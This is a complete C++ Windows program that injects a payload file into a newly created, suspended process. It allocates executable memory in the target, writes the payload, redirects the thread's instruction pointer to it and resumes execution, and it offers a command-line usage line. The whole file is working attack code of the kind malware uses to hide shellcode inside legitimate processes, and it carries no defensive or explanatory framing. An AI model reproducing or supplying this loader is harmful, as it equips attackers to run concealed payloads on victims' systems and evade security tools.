#include <windows.h>
#include <tlhelp32.h>
#include <iostream>
#include <fstream>

bool InjectPayload(const char* processPath, const char* payloadPath) {
    STARTUPINFO si = { sizeof(STARTUPINFO) };
    PROCESS_INFORMATION pi = { 0 };

    if (!CreateProcess(processPath, nullptr, nullptr, nullptr, FALSE, CREATE_SUSPENDED, nullptr, nullptr, &si, &pi)) {
        std::cerr << "Failed to create process: " << GetLastError() << std::endl;
        return false;
    }

    std::ifstream payloadFile(payloadPath, std::ios::binary | std::ios::ate);
    if (!payloadFile.is_open()) {
        std::cerr << "Failed to open payload file.\n";
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    size_t payloadSize = payloadFile.tellg();
    payloadFile.seekg(0, std::ios::beg);
    char* payloadData = new char[payloadSize];
    payloadFile.read(payloadData, payloadSize);
    payloadFile.close();

    LPVOID allocAddress = VirtualAllocEx(pi.hProcess, nullptr, payloadSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (!allocAddress) {
        std::cerr << "Failed to allocate memory in target process.\n";
        delete[] payloadData;
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    if (!WriteProcessMemory(pi.hProcess, allocAddress, payloadData, payloadSize, nullptr)) {
        std::cerr << "Failed to write payload to target process.\n";
        VirtualFreeEx(pi.hProcess, allocAddress, 0, MEM_RELEASE);
        delete[] payloadData;
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
    delete[] payloadData;

    CONTEXT ctx;
    ctx.ContextFlags = CONTEXT_FULL;
    if (!GetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Failed to get thread context.\n";
        VirtualFreeEx(pi.hProcess, allocAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return false;
    }
#ifdef _WIN64
    ctx.Rip = (DWORD64)allocAddress; // 64
#else
    ctx.Eip = (DWORD)allocAddress;  // 32
#endif
    if (!SetThreadContext(pi.hThread, &ctx)) {
        std::cerr << "Failed to set thread context.\n";
        VirtualFreeEx(pi.hProcess, allocAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        std::cerr << "Failed to resume target thread.\n";
        VirtualFreeEx(pi.hProcess, allocAddress, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 1);
        return false;
    }

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
    return true;
}

int main(int argc, char* argv[]) {
    if (argc != 3) {
        std::cerr << "Usage: " << argv[0] << " <payload> <target.exe>\n";
        return 1;
    }

    const char* payloadPath = argv[1];
    const char* targetPath = argv[2];

    if (!InjectPayload(targetPath, payloadPath)) {
        std::cerr << "Injection failed.\n";
        return 1;
    }

    std::cout << "Injection successful.\n";
    return 0;
}
